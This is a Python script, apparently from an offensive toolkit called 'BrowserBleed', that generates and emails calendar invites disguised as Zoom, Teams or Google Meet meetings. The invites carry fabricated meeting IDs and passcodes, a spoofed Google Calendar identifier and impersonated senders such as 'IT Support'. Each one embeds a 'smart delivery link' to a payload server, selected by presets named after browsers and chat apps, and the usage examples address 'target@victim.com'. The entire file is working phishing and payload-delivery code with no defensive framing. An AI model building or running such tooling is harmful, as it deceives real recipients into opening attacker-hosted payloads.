#!/usr/bin/env python3
"""
invite.py — Generate ICS calendar invites with a BrowserBleed smart delivery link.

Usage:
  python3 invite.py --preset chrome --from-name "Sarah Johnson" \
      --from-email sarah@company.com --to target@victim.com
"""

import argparse
import base64
import os
import random
import smtplib
import ssl
import string
import sys
import uuid
from datetime import datetime, timedelta, timezone
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr

PROVIDERS = {
    'gmail':     ('smtp.gmail.com', 587),
    'outlook':   ('smtp-mail.outlook.com', 587),
    'office365': ('smtp.office365.com', 587),
}

PRESETS = {
    'chrome':   {'subject': 'Q3 Planning Sync',      'disguise': 'zoom'},
    'edge':     {'subject': 'Browser Policy Review', 'disguise': 'teams'},
    'brave':    {'subject': 'Security Briefing',     'disguise': 'zoom'},
    'firefox':  {'subject': 'Weekly Sync',           'disguise': 'google-meet'},
    'opera':    {'subject': 'Team Check-In',         'disguise': 'zoom'},
    'slack':    {'subject': 'Team Standup',          'disguise': 'zoom'},
    'discord':  {'subject': 'Community Call',        'disguise': 'zoom'},
    'teams':    {'subject': 'Project Review',        'disguise': 'teams'},
    'zoom':     {'subject': 'Weekly Check-In',       'disguise': 'zoom'},
    'whatsapp': {'subject': 'Quick Catch-Up',        'disguise': 'zoom'},
    'telegram': {'subject': 'Project Discussion',    'disguise': 'zoom'},
}

DISGUISES = ('auto', 'zoom', 'teams', 'google-meet', 'generic')


def load_domain_from_config():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    config_path = os.path.join(script_dir, 'deploy', 'config')
    try:
        with open(config_path) as f:
            for line in f:
                line = line.strip()
                if line.startswith('#') or '=' not in line:
                    continue
                k, v = line.split('=', 1)
                if k.strip() == 'DOMAIN':
                    return 'https://' + v.strip()
    except FileNotFoundError:
        pass
    return None


def esc_ics(s):
    return (s.replace('\\', '\\\\')
             .replace(';',  '\\;')
             .replace(',',  '\\,')
             .replace('\n', '\\n'))


def fold_ics(line):
    """Fold long ICS property lines at 75 UTF-8 bytes (RFC 5545 §3.1)."""
    out = []
    while len(line.encode('utf-8')) > 75:
        i = 75
        while i > 0 and len(line[:i].encode('utf-8')) > 75:
            i -= 1
        out.append(line[:i])
        line = ' ' + line[i:]
    out.append(line)
    return '\r\n'.join(out)


def ics_dt(dt):
    utc = dt.astimezone(timezone.utc)
    return utc.strftime('%Y%m%dT%H%M%SZ')


def _rand_digits(n):
    return ''.join(random.choices(string.digits, k=n))


def _rand_letters(n):
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def build_description(disguise, subject, smart_url, from_name):
    zoom_id  = f'{_rand_digits(3)} {_rand_digits(4)} {_rand_digits(4)}'
    zoom_num = zoom_id.replace(' ', '')
    passcode = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    meet_id  = f'{_rand_digits(3)} {_rand_digits(4)} {_rand_digits(6)} {_rand_digits(3)}'
    sep = '──────────────────────────'

    if disguise == 'zoom':
        return '\n'.join([
            'You are invited to a Zoom meeting.',
            '',
            f'Topic: {subject}',
            '',
            'Join Zoom Meeting',
            f'https://zoom.us/j/{zoom_num}?pwd={passcode}',
            '',
            f'Meeting ID: {zoom_id}',
            f'Passcode: {passcode}',
            '',
            sep,
            'Pre-meeting materials:',
            smart_url,
            sep,
            '',
            f'One tap mobile: +16699006833,,{zoom_num}# US (San Jose)',
        ])

    elif disguise == 'teams':
        safe = base64.b64encode(subject.encode()).decode()
        safe = ''.join(c for c in safe if c.isalnum())
        return '\n'.join([
            'Microsoft Teams meeting',
            '',
            'Join on your computer or mobile app',
            f'https://teams.microsoft.com/l/meetup-join/19:meeting_{safe}@thread.v2/0',
            '',
            f'Meeting ID: {meet_id}',
            f'Passcode: {passcode}',
            '',
            sep,
            'Download meeting companion:',
            smart_url,
            sep,
        ])

    elif disguise == 'google-meet':
        code = f'{_rand_letters(3)}-{_rand_letters(4)}-{_rand_letters(3)}'
        area, prefix, num = _rand_digits(3), _rand_digits(3), _rand_digits(4)
        pin = _rand_digits(7)
        return '\n'.join([
            f'Video call link: https://meet.google.com/{code}',
            '',
            f'Or dial: (US) +1 {area}-{prefix}-{num}',
            f'PIN: {pin}#',
            '',
            sep,
            'Meeting materials:',
            smart_url,
            sep,
        ])

    else:  # generic
        return '\n'.join([
            'Please review the attached document before our meeting.',
            '',
            f'Topic: {subject}',
            '',
            'Access materials here:',
            smart_url,
            '',
            sep,
            f'This invitation was sent by {from_name}',
        ])


def send_invite(ics_content, from_name, from_email, to_emails, subject,
                smtp_host, smtp_port, smtp_user, smtp_pass):
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = formataddr((from_name, from_email))
    msg['To'] = ', '.join(to_emails)

    msg.attach(MIMEText(
        f'You have been invited to: {subject}\n\n'
        'This invite requires a calendar application to view.',
        'plain', 'utf-8',
    ))

    cal = MIMEText(ics_content, 'calendar', 'utf-8')
    cal.set_param('method', 'REQUEST')
    msg.attach(cal)

    ctx = ssl.create_default_context()
    with smtplib.SMTP(smtp_host, smtp_port) as s:
        s.ehlo()
        s.starttls(context=ctx)
        s.ehlo()
        s.login(smtp_user, smtp_pass)
        s.sendmail(from_email, to_emails, msg.as_string())


def generate_ics(*, preset, from_name, from_email, to_emails,
                 subject, start_dt, duration_min, disguise, server_url):
    end_dt    = start_dt + timedelta(minutes=duration_min)
    smart_url = f'{server_url}/p/{preset}'
    domain    = from_email.split('@')[1] if '@' in from_email else 'calendar.invite'
    uid       = f'{uuid.uuid4()}@{domain}'

    eff_disguise = PRESETS[preset]['disguise'] if disguise == 'auto' else disguise
    desc = build_description(eff_disguise, subject, smart_url, from_name)

    lines = [
        'BEGIN:VCALENDAR',
        'VERSION:2.0',
        'PRODID:-//Google Inc//Google Calendar 70.9054//EN',
        'CALSCALE:GREGORIAN',
        'METHOD:REQUEST',
        'BEGIN:VEVENT',
        fold_ics(f'UID:{uid}'),
        f'DTSTART:{ics_dt(start_dt)}',
        f'DTEND:{ics_dt(end_dt)}',
        fold_ics(f'ORGANIZER;CN="{esc_ics(from_name)}":mailto:{from_email}'),
    ]
    for to in to_emails:
        lines.append(fold_ics(
            f'ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;'
            f'PARTSTAT=NEEDS-ACTION;RSVP=TRUE;CN={to}:mailto:{to}'
        ))
    lines += [
        fold_ics(f'SUMMARY:{esc_ics(subject)}'),
        fold_ics(f'DESCRIPTION:{esc_ics(desc)}'),
        fold_ics(f'ATTACH;VALUE=URI:{smart_url}'),
        'END:VEVENT',
        'END:VCALENDAR',
    ]
    return '\r\n'.join(lines) + '\r\n'


def parse_date(s):
    for fmt in ('%Y-%m-%d %H:%M', '%Y-%m-%dT%H:%M', '%Y-%m-%d'):
        try:
            return datetime.strptime(s, fmt)
        except ValueError:
            continue
    raise argparse.ArgumentTypeError(
        f"unrecognised date format {s!r} — use YYYY-MM-DD HH:MM"
    )


def default_date():
    tomorrow = datetime.now() + timedelta(days=1)
    return tomorrow.replace(hour=10, minute=0, second=0, microsecond=0)


def main():
    p = argparse.ArgumentParser(
        description='Generate a BrowserBleed ICS calendar invite',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic — reads DOMAIN from deploy/config:
  python3 invite.py --preset chrome \\
      --from-name "Sarah Johnson" --from-email sarah@company.com \\
      --to target@victim.com

  # Multiple recipients, custom subject, Teams disguise:
  python3 invite.py --preset teams \\
      --from-name "IT Support" --from-email it@company.com \\
      --to alice@victim.com --to bob@victim.com \\
      --subject "Mandatory Security Training" --disguise teams \\
      --date "2026-07-01 09:00" --duration 60

  # Override server URL, write to specific file:
  python3 invite.py --preset zoom --server https://reports.example.com \\
      --from-name "HR" --from-email hr@company.com \\
      --to target@victim.com --out /tmp/meeting.ics
""")
    p.add_argument('--preset',     required=True,  choices=sorted(PRESETS),
                   help='Payload preset — determines smart link and default disguise')
    p.add_argument('--from-name',  required=True,  metavar='NAME',
                   help='Organizer display name')
    p.add_argument('--from-email', required=True,  metavar='EMAIL',
                   help='Organizer email address')
    p.add_argument('--to',         required=True,  metavar='EMAIL', action='append',
                   dest='to_emails', help='Recipient email (repeat for multiple)')
    p.add_argument('--subject',    metavar='TEXT',
                   help='Meeting subject (default: preset default)')
    p.add_argument('--date',       metavar='YYYY-MM-DD HH:MM', type=parse_date,
                   help='Start date/time in local time (default: tomorrow 10:00)')
    p.add_argument('--duration',   type=int, default=60, metavar='MINS',
                   help='Duration in minutes (default: 60)')
    p.add_argument('--disguise',   choices=DISGUISES, default='auto',
                   help='Meeting disguise template (default: auto — match preset)')
    p.add_argument('--server',     metavar='URL',
                   help='Base server URL, e.g. https://reports.example.com '
                        '(default: read DOMAIN from deploy/config)')
    p.add_argument('--out',        metavar='FILE',
                   help='Output file (default: <preset>-invite.ics)')
    p.add_argument('--send',       action='store_true',
                   help='Send via SMTP instead of writing to file')
    p.add_argument('--provider',   choices=sorted(PROVIDERS), metavar='NAME',
                   help='SMTP provider shortcut: gmail, outlook, office365')
    p.add_argument('--smtp-host',  metavar='HOST', help='SMTP host (overrides --provider)')
    p.add_argument('--smtp-port',  type=int, default=587, metavar='PORT',
                   help='SMTP port (default: 587)')
    p.add_argument('--smtp-user',  metavar='USER', help='SMTP login / username')
    p.add_argument('--smtp-pass',  metavar='PASS', help='SMTP password or app password')

    args = p.parse_args()

    # Resolve server URL
    server_url = args.server
    if not server_url:
        server_url = load_domain_from_config()
    if not server_url:
        p.error(
            'No server URL: set --server or add DOMAIN=your-domain.com to deploy/config'
        )
    server_url = server_url.rstrip('/')

    # Defaults
    subject    = args.subject or PRESETS[args.preset]['subject']
    start_dt   = args.date or default_date()
    out_path   = args.out or f'{args.preset}-invite.ics'

    ics = generate_ics(
        preset       = args.preset,
        from_name    = args.from_name,
        from_email   = args.from_email,
        to_emails    = args.to_emails,
        subject      = subject,
        start_dt     = start_dt,
        duration_min = args.duration,
        disguise     = args.disguise,
        server_url   = server_url,
    )

    info = [
        f'    From:     {args.from_name} <{args.from_email}>',
        f'    To:       {", ".join(args.to_emails)}',
        f'    Subject:  {subject}',
        f'    Start:    {start_dt.strftime("%Y-%m-%d %H:%M")} local',
        f'    Duration: {args.duration} min',
        f'    Disguise: {args.disguise if args.disguise != "auto" else PRESETS[args.preset]["disguise"]} ({"auto" if args.disguise == "auto" else "manual"})',
        f'    Link:     {server_url}/p/{args.preset}',
    ]

    if args.send:
        smtp_host = args.smtp_host
        smtp_port = args.smtp_port
        if args.provider and not smtp_host:
            smtp_host, smtp_port = PROVIDERS[args.provider]
        if not smtp_host:
            p.error('--send requires --smtp-host or --provider')
        if not args.smtp_user:
            p.error('--send requires --smtp-user')
        if not args.smtp_pass:
            p.error('--send requires --smtp-pass')
        try:
            send_invite(ics, args.from_name, args.from_email, args.to_emails, subject,
                        smtp_host, smtp_port, args.smtp_user, args.smtp_pass)
        except Exception as exc:
            print(f'[!] Send failed: {exc}', file=sys.stderr)
            sys.exit(1)
        print(f'[+] Sent to {", ".join(args.to_emails)} via {smtp_host}:{smtp_port}')
        for line in info:
            print(line)
    else:
        with open(out_path, 'w', newline='', encoding='utf-8') as f:
            f.write(ics)
        print(f'[+] Wrote {out_path}')
        for line in info:
            print(line)


if __name__ == '__main__':
    main()
